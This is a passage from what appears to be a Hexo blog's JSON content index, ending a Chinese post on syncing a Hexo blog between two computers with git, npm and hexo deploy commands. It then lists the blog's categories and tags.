仓库地址，把远端仓库的hexo分支clone到本地 cd yourname.github.io，切换到上一步clone的文件夹中 npm install，在clone下来的仓库文件夹中安装所需要的必要组件，不需要再init 5 发布博文后续不管是PC1还是PC2，如果修改了主题或者新增了博文，按照以下步骤即可： git pull origin hexo，先pull完成本地与远端的融合 hexo new post test.md，新建一个.md文件进行测试 git add source ，经测试只要更新source即可，因为只是修改了博客。如果修改的是主题文件，则更新theme文件夹 git commit -m “修改说明”，提交修改； git push origin hexo，更新至hexo分支； hexo d -g，将博文静态页面发布至maser分支。 参考链接原文链接：https://blog.csdn.net/sinat_37781304/article/details/82729029","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://avalooooooon.github.io/tags/hexo/"}]}],"categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"},{"name":"shell","slug":"shell","permalink":"https://avalooooooon.github.io/categories/shell/"},{"name":"Webpack","slug":"前端/Webpack","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/Webpack/"},{"name":"leetcode","slug":"leetcode","permalink":"https://avalooooooon.github.io/categories/leetcode/"},{"name":"后端","slug":"后端","permalink":"https://avalooooooon.github.io/categories/%E5%90%8E%E7%AB%AF/"},{"name":"node.js","slug":"后端/node-js","permalink":"https://avalooooooon.github.io/categories/%E5%90%8E%E7%AB%AF/node-js/"},{"name":"vpn","slug":"vpn","permalink":"https://avalooooooon.github.io/categories/vpn/"},{"name":"HTML/CSS","slug":"前端/HTML-CSS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/HTML-CSS/"},{"name":"Vue","slug":"前端/Vue","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/Vue/"},{"name":"C++","slug":"C","permalink":"https://avalooooooon.github.io/categories/C/"},{"name":"git","slug":"git","permalink":"https://avalooooooon.github.io/categories/git/"},{"name":"文档编写","slug":"文档编写","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/"},{"name":"编辑器","slug":"文档编写/编辑器","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/%E7%BC%96%E8%BE%91%E5%99%A8/"},{"name":".md","slug":"文档编写/md","permalink":"https://avalooooooon.github.io/categories/%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99/md/"}],"tags":[{"name":"JS","slug":"JS","permalink":"https://avalooooooon.github.io/tags/JS/"},{"name":"操作系统","slug":"操作系统","permalink":"https://avalooooooon.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"shell","slug":"shell","permalink":"https://avalooooooon.github.io/tags/shell/"},{"name":"Vue","slug":"Vue","permalink":"https://avalooooooon.github.io/tags/Vue/"},{"name":"Webpack","slug":"Webpack","permalink":"https://avalooooooon.github.io/tags/Webpack/"},{"name":"leetcode","slug":"leetcode","permalink":"https://avalooooooon.github.io/tags/leetcode/"},{"name":"node.js","slug":"node-js","permalink":"https://avalooooooon.github.io/tags/node-js/"},{"name":"vpn","slug":"vpn","permalink":"https://avalooooooon.github.io/tags/vpn/"},{"name":"HTML","slug":"HTML","permalink":"https://avalooooooon.github.io/tags/HTML/"},{"name":"CSS","slug":"CSS","permalink":"https://avalooooooon.github.io/tags/CSS/"},{"name":"C++","slug":"C","permalink":"https://avalooooooon.github.io/tags/C/"},{"name":"node","slug":"node","permalink":"https://avalooooooon.github.io/tags/node/"},{"name":"git","slug":"git","permalink":"https://avalooooooon.github.io/tags/git/"},{"name":"markdown","slug":"markdown","permalink":"https://avalooooooon.github.io/tags/markdown/"},{"name":"hexo","slug":"hexo","permalink":"https://avalooooooon.github.io/tags/hexo/"}]}